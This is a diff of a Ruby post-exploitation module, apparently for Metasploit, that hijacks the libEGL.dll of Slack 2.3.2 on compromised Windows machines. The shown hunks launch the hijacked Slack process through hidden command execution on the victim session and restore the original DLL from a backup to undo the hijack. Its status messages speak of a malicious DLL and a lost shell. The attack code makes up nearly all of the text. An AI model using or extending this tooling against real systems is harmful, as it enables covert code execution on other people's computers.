@@ -181,7 +181,7 @@ def ls_stage1
 
           # start remote malicious service
           print_status("Start slack 2.3.2 service remotelly...")
-          r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
+          r = session.sys.process.execute("cmd.exe /c start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
         # task completed successefully...
@@ -216,9 +216,8 @@ def ls_stage2
 
   r=''
   session = client
-  s_name = "slack.exe"                        # service executable
   p_name = "libEGL.dll"                       # malicious libEGL.dll
-  b_name = "libEGL.bk"                        # service executable
+  b_name = "libEGL.bk"                        # libEGL.dll remote backup
   d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -227,7 +226,7 @@ def ls_stage2
     print_warning("Please set REVERT_HIJACK option!")
     return nil
   else
-    print_status("Deleting malicious dll.")
+    print_status("Detecting remote malicious dll.")
     sleep(1.5)
   end
 
@@ -243,7 +242,8 @@ def ls_stage2
       print_good(" Revert slack dll to default stage...")
       r = session.sys.process.execute("cmd.exe /c MOVE /Y #{d_path}\\#{b_name} #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
-      print_status("slack dll reverted to default stage...")
+      print_status("dll hijacking in slack 2.3.2 reverted...")
+      print_warning("we have lost our shell,but feeded the white hacker within... ")
       print_line("")
 
     # close channel when done
@@ -252,7 +252,7 @@ def ls_stage2
 
     else
       print_error("[ ABORT ]: post-module cant find backup dll...")
-      print_error("backup dll: #{d_path}\\#{b_name}")
+      print_error("backup_dll: #{d_path}\\#{b_name}")
       print_line("")
     end
 
